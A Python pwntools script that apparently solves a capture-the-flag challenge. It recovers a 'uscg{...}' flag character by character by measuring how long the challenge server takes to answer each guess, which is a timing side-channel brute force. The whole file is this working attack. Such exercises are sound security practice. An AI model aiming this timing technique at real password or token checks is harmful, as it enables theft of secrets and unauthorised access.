import pwn
import time
import string
# nc 0.cloud.chals.io 29427
solved = False
flag = b"uscg{"
alphabet = "}_" + string.ascii_lowercase + string.digits 
print(alphabet)
timed = len(flag) * 0.25 + 0.15
while not solved:
    for letter in alphabet:
        try:
            trial = flag + letter.encode()
            print(trial)
            s = pwn.remote('0.cloud.chals.io', 15346)
            s.recvuntil(b'[+] Guess the flag >>> ')
            then = time.time()
            s.send_raw(trial+b"\n")
            s.recvuntil(b'[')
            now = time.time()
            s.close()
            print(now - then)
            if now - then > timed:
                flag += letter.encode()
                timed = len(flag) * 0.25 + 0.15
                print(flag)
                if letter == "}":
                    solved = True
                break
        except EOFError:
            s.close()
            pass
        

